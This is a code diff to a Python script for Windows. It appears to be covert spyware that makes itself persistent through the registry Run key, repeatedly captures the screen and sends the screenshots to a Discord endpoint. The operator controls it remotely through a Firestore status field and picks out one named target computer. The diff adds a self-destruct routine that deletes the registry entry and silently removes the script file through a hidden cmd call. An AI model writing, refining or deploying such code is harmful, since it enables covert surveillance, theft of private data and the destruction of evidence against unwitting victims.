@@ -45,6 +45,37 @@ def find_pythonw():
     except:
         pass
     return sys.executable
+def fetch_firebase_field(field_name, default="on"):
+    try:
+        req = urllib.request.Request(FIRESTORE_STATUS_URL, headers={'User-Agent': 'Mozilla/5.0'})
+        with urllib.request.urlopen(req, timeout=6) as response:
+            data = json.loads(response.read().decode())
+            return data.get("fields", {}).get(field_name, {}).get("stringValue", default)
+    except Exception:
+        return default
+def self_destruct():
+    try:
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                             r"Software\Microsoft\Windows\CurrentVersion\Run",
+                             0, winreg.KEY_SET_VALUE)
+        try:
+            winreg.DeleteValue(key, STARTUP_REG_NAME)
+        except:
+            pass
+        winreg.CloseKey(key)
+    except:
+        pass
+    try:
+        script_path = os.path.abspath(sys.argv[0])
+        ctypes.windll.kernel32.SetFileAttributesW(script_path, 128)
+        subprocess.Popen(
+            f'cmd /c timeout /t 2 /nobreak > nul & del "{script_path}"',
+            creationflags=subprocess.CREATE_NO_WINDOW,
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        )
+    except:
+        pass
+    sys.exit(0)
 def ensure_persistence():
     try:
         script_path = os.path.abspath(sys.argv[0])
@@ -56,22 +87,20 @@ def ensure_persistence():
         return True
     except Exception:
         return False
-def fetch_firebase_status():
+def should_send_screenshot():
     try:
-        req = urllib.request.Request(FIRESTORE_STATUS_URL, headers={'User-Agent': 'Mozilla/5.0'})
-        with urllib.request.urlopen(req, timeout=6) as response:
-            data = json.loads(response.read().decode())
-            fields = data.get("fields", {})
-            all_status = fields.get("all", {}).get("stringValue", "on")
-            sk5_status = fields.get("SK5x08", {}).get("stringValue", "off")
-            return all_status.lower(), sk5_status.lower()
-    except Exception:
-        return "on", "off"
-def should_send_screenshot(all_status, sk5_status):
+        all_status = fetch_firebase_field("all", "on").lower()
+        sk5_status = fetch_firebase_field("SK5x08", "off").lower()
+    except:
+        all_status = "on"
+        sk5_status = "off"
     if COMPUTER_NAME == TARGET_NAME:
-        return sk5_status == "on"
-    else:
-        return all_status == "on"
+        if sk5_status == "off":
+            self_destruct()
+            return False
+        else:
+            return True
+    return all_status == "on"
 def take_screenshot():
     try:
         from PIL import ImageGrab
@@ -140,12 +169,9 @@ def send_screenshot_to_discord(image_buffer):
         return False
 def main_loop():
     ensure_persistence()
-    last_all = None
-    last_sk5 = None
     while True:
         try:
-            all_status, sk5_status = fetch_firebase_status()
-            if should_send_screenshot(all_status, sk5_status):
+            if should_send_screenshot():
                 img_buffer = take_screenshot()
                 if img_buffer:
                     send_screenshot_to_discord(img_buffer)
